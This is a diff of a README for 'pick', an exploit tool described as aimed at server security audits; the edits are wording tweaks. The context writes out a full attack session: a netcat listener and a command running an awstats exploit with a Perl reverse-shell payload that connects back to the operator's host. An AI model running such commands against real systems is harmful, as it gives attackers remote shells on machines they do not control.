@@ -33,7 +33,7 @@ Options:
    --payload-opts <n1=v1,[n2=v2,...]>    : provide payload options
 ```
 
-By default `pick` comes statically compiled which makes it perfect for checking for local privileges escalation vulnerabilities when doing security server audits.
+By default `pick` comes statically compiled which makes it perfect for checking for local privileges escalation vulnerabilities when doing server security audits.
 
 ### Typical command line session
 
@@ -128,7 +128,7 @@ LHOST                   yes
 LPORT                   yes
 ```
 
-Prepare connection handler on local (192.168.1.1) machine for `cmd-reverse-perl` payload:
+For reverse shell payloads (`*-reverse-*`) connection handler has to be created before running the exploit. On local (192.168.1.1 in this example) machine run:
 
     $ nc -l -p 4444
 
@@ -136,5 +136,5 @@ On second terminal fire up exploit of choice with your settings:
 
     $ ./pick --exploit exec-awstats --payload cmd-reverse-perl --exploit-opts RHOST=192.168.1.2,RPORT=80 --payload-opts LHOST=192.168.1.1,LPORT=4444
 
-Get back to terminal with your connection handler and enjoy interactive remote shell session.
+Get back to terminal with your connection handler and (if target machine is vulnerable) enjoy interactive remote shell session.
 
